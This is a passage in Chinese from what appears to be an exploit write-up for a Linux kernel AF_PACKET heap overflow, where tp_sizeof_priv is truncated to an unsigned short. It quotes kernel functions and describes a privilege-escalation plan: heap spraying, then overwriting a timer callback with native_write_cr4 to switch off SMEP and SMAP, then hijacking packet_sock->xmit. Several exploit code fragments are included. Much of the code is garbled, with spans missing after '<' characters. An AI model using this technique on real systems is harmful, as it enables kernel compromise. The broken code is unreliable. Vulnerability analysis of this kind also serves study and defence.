int）赋值给了p1->blk_sizeof_priv（unsigned
short），被分割成低位字节。因为tp_sizeof_priv可控，所以blk_sizeof_priv也可控。
    static void init_prb_bdqc(struct packet_sock *po,
       struct packet_ring_buffer *rb,
       struct pgv *pg_vec,
       union tpacket_req_u *req_u)
    {
     struct tpacket_kbdq_core *p1 = GET_PBDQC_FROM_RB(rb);
     struct tpacket_block_desc *pbd;
     ...
     p1->blk_sizeof_priv = req_u->req3.tp_sizeof_priv;
     p1->max_frame_len = p1->kblk_size - BLK_PLUS_PRIV(p1->blk_sizeof_priv); 
     prb_init_ft_ops(p1, req_u);
     prb_setup_retire_blk_timer(po);
     prb_open_block(p1, pbd); //初始化第一个内存块
    }
因为blk_sizeof_priv可控，进而可以间接控制max_frame_len的值，该值是最大帧范围，控制max_frame_len的值超过实际帧大小，当内核接收数据包即可绕大小检测。
    static void prb_open_block(struct tpacket_kbdq_core *pkc1,
     struct tpacket_block_desc *pbd1)
    {
     struct timespec ts;
     struct tpacket_hdr_v1 *h1 = &pbd1->hdr.bh1;
     ...
     pkc1->pkblk_start = (char *)pbd1;          
     pkc1->nxt_offset = pkc1->pkblk_start + BLK_PLUS_PRIV(pkc1->blk_sizeof_priv);
     BLOCK_O2FP(pbd1) = (__u32)BLK_PLUS_PRIV(pkc1->blk_sizeof_priv);  
     BLOCK_O2PRIV(pbd1) = BLK_HDR_LEN;
     ...
    }
nxt_offset是写入内存块的偏移量。通过pkc1->blk_sizeof_priv间接控nxt_offset。从packet_set_ring函数绕过检测开始，后面的最大值以及写入偏移都可控，所以可以利用溢出修改SMEP和SMAP保护。
利用思路首先创建一个环形缓冲区，再在某个环形缓冲区内存后面分配一个packet_sock对象，将接收环形缓冲区附加到packet_sock对象，溢出它，覆盖prb_bdqc->retire_blk_timer字段，使得retire_blk_timer->func指向native_write_cr4函数，retire_blk_timer->data
设置覆盖值，等待计时器执行func后关闭SMEP和SMAP。native_write_cr4函数是内核4.x版本的内置inline汇编函数，主要用来修改CR4寄存器的。
堆分配512个 socket对象
    void kmalloc_pad(int count) {
        for(int i=0;ifunction = func;  // 为 native_write_cr4  函数地址
     timer->data = arg;
     timer->flags = 1;
        // 发送数据包到接收环形缓冲区上，溢出环形缓冲区的retire_blk_timer->func，并等待计时器执行
     oob_write(&buffer[0] + 2, sizeof(*timer) + 8 - 2);
     sleep(1);
    }
    // 为了构造堆溢出，计算到 retire_blk_timer 的偏移值
    int oob_setup(int offset) {
     unsigned int maclen = ETH_HDR_LEN;
     unsigned int netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +
        (maclen xmit的偏移
     oob_setup(2048 + XMIT_OFFSET - 64);
     int ps[32];
     int i;
     for (i = 0; i xmit处
     oob_write((char *)&buffer[0] + 2, sizeof(*xmit) + 64 - 2);
     for (i = 0; i = DUMMY_ITERATIONS)